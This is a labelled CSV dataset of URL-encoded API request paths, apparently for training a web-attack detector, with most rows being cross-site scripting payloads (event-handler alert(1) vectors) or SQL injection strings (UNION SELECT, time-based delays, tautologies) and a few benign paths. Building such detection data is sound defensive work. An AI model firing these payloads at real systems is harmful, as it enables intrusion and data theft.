text,label
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cspacer+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fspacer%3E,xss
/api/v1/search?q=or+%27%27%3D%27,sql_injection
/api/v1/feedback?message=%3Cblockquote+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fblockquote%3E%3Cinput+autofocus%3E,xss
/v1/orders?customer_id=ORDER+BY+30%23&status=active,sql_injection
/v1/search?q=%3Coptgroup+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Foptgroup%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Cvideo+autoplay+controls+onpause%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E,xss
/api/v1/orders?customer_id=242721,benign
/api/v1/feedback?message=%3Cblockquote+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,xss
/api/v1/users?id=%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v1/feedback?message=%3Ccenter+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fcenter%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cxmp+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fxmp%3E,xss
/v1/search?q=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E,xss
/v1/products/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--,sql_injection
/api/v1/orders/127474,benign
/api/v1/feedback?message=%3Ccommand+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcommand%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccanvas+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcanvas%3E,xss
/api/v2/profile?id=%3Cparam+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fparam%3E,xss
/api/v1/comments?text=%3Cform%3E%3Ctextarea+oninvalid%3Dalert%281%29+required%3E%3Cinput+type%3Dsubmit%3E,xss
/v1/search?q=%3Clisting+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cvideo+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fvideo%3E,xss
/v1/products/%2528,sql_injection
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmain+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmain%3E,xss
/api/v1/reviews?body=%3Cdiv+id%3D%22109%22%3E%3Csvg+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E,xss
/api/v1/comments?text=%3Cmeter+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v2/profile?id=%3Cslot+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fslot%3E,xss
/api/v1/feedback?message=%3Chr+onclick%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,xss
/api/v2/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%23&key=API_KEY,sql_injection
/api/v2/comments/%3Crtc+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Frtc%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cstrong+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fstrong%3E,xss
/api/v1/reviews?body=%3Cmark+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmark%3E,xss
/v1/profile?bio=%3Cplaintext+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v1/user/588154,benign
/api/v1/users/69634,benign
/api/v1/users?id=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%23,sql_injection
/api/v1/reviews?body=%3Cdir+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,xss
/api/v1/reviews?body=%3Cnav+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnav%3E,xss
/api/v2/profile?id=%3Cfigcaption+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/v1/profile?bio=%3Cplaintext+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4,sql_injection
/api/v2/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cdetails+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdetails%3E,xss
/api/v1/feedback?message=%3Cframe+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fframe%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cimage+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fimage%3E,xss
/v1/orders?customer_id=%27+union+select+%2A+from+users+where+login+%3D+char%28114%2C111%2C111%2C116%29%3B&status=active,sql_injection
/api/v2/comments/%3Clegend+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Flegend%3E,xss
/api/v1/feedback?message=%3Cstyle+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fstyle%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cframeset+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fframeset%3E,xss
/api/v2/profile?id=%3Cdel+onclick%3D%22alert%281%29%22%3Etest%3C%2Fdel%3E,xss
/api/v2/comments/%3Cnoscript+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fnoscript%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2--&status=active,sql_injection
/v1/search?q=%3Cspacer+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspacer%3E,xss
/api/v2/comments/%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%2891%29%3C%2Fscript%3E%22%3E,xss
/api/v2/comments/%3Cimg+srcset%3D1+onerror%3Dalert%281%29%3E,xss
/v1/products/%22%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--,sql_injection
/api/v1/feedback?message=%3Cdiv+id%3D%22dropbox%22+style%3D%22height%3A+360px%3Bwidth%3A+500px%3Bborder%3A+5px+solid+%23000%3Bposition%3A+relative%3B%22+ondragover%3D%22event.preventDefault%28%29%22%3E%2B+Drop+Box+%2B%3C%2Fdiv%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cslot+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fslot%3E,xss
/api/v1/reviews?body=%3Cacronym+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cheader+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fheader%3E,xss
/v1/profile?bio=%3Ctable+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftable%3E,xss
/api/v2/users/13761,benign
/v1/search?q=%3Cdd+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdd%3E,xss
/api/v2/search?q=WHERE+1%3D1+AND+1%3D1--&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Ccode+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/feedback?message=%3Cth+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fth%3E,xss
/api/v1/feedback?message=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Celement+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Felement%3E,xss
/api/v1/comments?text=%3Coutput+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/api/v1/comments?text=%3Cthead+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fthead%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ch1+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fh1%3E,xss
/api/v1/reviews?body=%3Coutput+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cvideo+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fvideo%3E,xss
/v1/search?q=%3Cb+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fb%3E,xss
/api/v1/reviews?body=%3Cshadow+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fshadow%3E,xss
/api/v2/comments/%3Cruby+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fruby%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctd+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftd%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cdl+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fdl%3E,xss
/api/v1/reviews?body=%3Coutput+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Foutput%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Ccite+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fcite%3E,xss
/api/v2/profile?id=%3Cmulticol+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fmulticol%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Csvg+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fsvg%3E,xss
/subscriptions/sub-84886/resourceGroups/rg-dev88/providers/Microsoft.CognitiveServices/accounts/acct5413,benign
/api/v2/items/175330?key=APIKEY123,benign
/api/v2/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25--&key=API_KEY,sql_injection
/api/v1/products/999310,benign
/api/v2/profile?id=%3Cbig+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbig%3E,xss
/api/v2/profile?id=%3Cxml%3Anamespace+prefix%3D%22t%22%3E,xss
/api/v1/reviews?body=%3Cdiv+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v1/login?username=%27%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&password=pass,sql_injection
/api/v2/comments/%3Cstyle+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fstyle%3E,xss
/v1/profile?bio=%3Ccontent+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcontent%3E,xss
/api/v1/orders?customer_id=579078,benign
/v1/profile?bio=%3Cfooter+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffooter%3E,xss
/api/v2/profile?id=%3Cx+onxxx%253D1,xss
/api/v1/products/AK-XY-999,benign
/api/v2/comments/%3Crtc+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Frtc%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cmarquee+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Fmarquee%3E,xss
/v1/products/AND+1%3D1--,sql_injection
/api/v2/comments/%3Clink+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flink%3E,xss
/api/v2/comments/%3Ch1+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v1/cart?user_id=582960&action=view,benign
/api/v2/comments/%3Cu+onclick%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/v1/search?q=%3Clink+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Flink%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cmain+onclick%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/api/v1/profile?id=910261,benign
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Caudio+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Faudio%3E,xss
/v1/search?q=%3Cbase+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/api/v1/comments?text=%3Cthead+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fthead%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/comments?text=%3Ctfoot+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftfoot%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cabbr+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fabbr%3E,xss
/api/v2/comments/%3Cpre+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fpre%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/users?id=%22%29+or+benchmark%2810000000%2CMD5%281%29%29%23,sql_injection
/api/v1/user/401125,benign
/api/v2/profile?id=%3Cbase+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/api/v2/items/%27+union+%28select+NULL%2C+%28select+%40%40version%29%29+--?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctitle+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ftitle%3E,xss
/api/v2/comments/%3Ciframe%2Fonreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29+worksinIE%3E,xss
/v1/search?q=%3Clisting+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/profile?id=%3Ca+href%3Djavascript,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ckbd+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fkbd%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Csub+onload%3Dalert%281%29%3E%3C%2Fsub%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cruby+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fruby%3E,xss
/api/v2/comments/%3Chtml+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/api/v2/search?q=x%27+OR+full_name+LIKE+%27%25Bob%25&key=API_KEY,sql_injection
/api/v1/login?username=distinct&password=pass,sql_injection
/api/v1/cart?user_id=520227&action=view,benign
/v1/search?q=%3Cbutton+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fbutton%3E,xss
/api/v1/feedback?message=%3Cbdo+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fbdo%3E,xss
/api/v1/comments?text=%3Coutput+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/api/v1/users?id=desc,sql_injection
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ckbd+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fkbd%3E,xss
/v1/profile?bio=%3Coutput+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Foutput%3E,xss
/api/v2/profile?id=%3Chtml+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/api/v1/users?id=ORDER+BY+1%23,sql_injection
/api/v1/reviews?body=%3Cx+onmousedown%3Dalert%281%29%3Eclick+this%21,xss
/api/v2/comments/%3Cnoembed+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fnoembed%3E,xss
/v1/profile?bio=%3Ctextarea+onblur%3Dalert%281%29+id%3Dx%3E%3C%2Ftextarea%3E%3Cinput+autofocus%3E,xss
/api/v1/users?id=admin%27+or+1%3D1%2F%2A,sql_injection
/api/v1/comments?text=%3Cbgsound+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fbgsound%3E,xss
/api/v1/feedback?message=%3Cs+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fs%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Csup+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fsup%3E,xss
/api/v2/comments/%3Cp+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fp%3E,xss
/v1/profile?bio=%3Cmenu+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fmenu%3E,xss
/api/v2/items/%27+or+%271%27%3D%271%27%2F%2A?key=API_KEY,sql_injection
/api/v1/comments?text=%3Cpicture+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/api/v1/feedback?message=%3Ccol+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcol%3E,xss
/api/v2/profile?id=%3Cxmp+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fxmp%3E,xss
/api/v2/users/470393,benign
/api/v2/profile?id=%3Cfigcaption+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/reviews?body=%3Cmulticol+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fmulticol%3E,xss
/v1/search?q=%3Cselect+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fselect%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%23,sql_injection
/v1/search?q=%3Ctt+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Ftt%3E,xss
/api/v1/reviews?body=%3Cul+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ful%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/feedback?message=%3Ci+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fi%3E,xss
/api/v1/comments?text=%3Clegend+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Flegend%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cshadow+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Fshadow%3E,xss
/api/v1/comments?text=%3Csmall+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsmall%3E,xss
/api/v1/reviews?body=%3Cem+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,xss
/api/v1/users?id=hi+or+a%3Da,sql_injection
/api/v1/reviews?body=%3Cdetails+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fdetails%3E,xss
/api/v1/search?q=%C3%83%C2%BD+or+1%3D1+--,sql_injection
/api/v2/items/%27%3B+if+not%28select+system_user%29+%3C%3E+%27sa%27+waitfor+delay+%270%3A0%3A2%27+--?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cmain+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fmain%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&key=API_KEY,sql_injection
/api/v1/users?id=%22+or+isNULL%281%2F0%29+%2F%2A,sql_injection
/v1/profile?bio=%3Cmenuitem+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/login?username=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5--&password=pass,sql_injection
/api/v1/search?q=484107,benign
/v1/profile?bio=%3Ccenter+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v1/feedback?message=%3Clisting+onclick%3D%22alert%281%29%22%3Etest%3C%2Flisting%3E,xss
/api/v2/comments/%3Cbase+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbase%3E,xss
/v1/search?q=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cimg+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fimg%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cfigcaption+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ffigcaption%3E,xss
/api/v1/comments?text=%3Cpre+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpre%3E,xss
/api/v1/reviews?body=%3Cdialog+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdialog%3E,xss
/v1/search?q=%3Csvg+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/api/v1/comments?text=%3Cwbr+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fwbr%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Coutput+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Foutput%3E,xss
/v1/profile?bio=%3Cbody+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbody%3E,xss
/api/v2/items/%27%29%29%29%29+waitfor+delay+%270%3A0%3A20%27+%2F%2A?key=API_KEY,sql_injection
/v1/search?q=%3Ccanvas+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fcanvas%3E,xss
/v1/search?q=GIF89a%2F%2A%3Csvg%2Fonload%3Dalert%281%29%3E%2A%2F%3Dalert%28document.domain%29%2F%2F%3B,xss
/api/v1/comments?text=%22%3E%3Ciframe%2520src%3D%22http%3A%2F%2Fgoogle.com%22%25%25203E,xss
/v1/profile?bio=%3Cselect+autofocus+onfocus%3Dalert%281%29%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Ccontent+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fcontent%3E,xss
/api/v1/reviews?body=%3Cslot+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fslot%3E,xss
/v1/profile?bio=%3Ca+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fa%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Cembed+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/v1/search?q=%3Ccaption+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fcaption%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Cbdo+onload%3Dalert%281%29%3E%3C%2Fbdo%3E,xss
/v1/search?q=%3Ccode+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/feedback?message=%3Cdata+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdata%3E,xss
/api/v1/users?id=select+current_setting%28%27log_statement%27%29%3B,sql_injection
/v1/projects/proj-7628/locations/europe-west1/datasets/ds_7245,benign
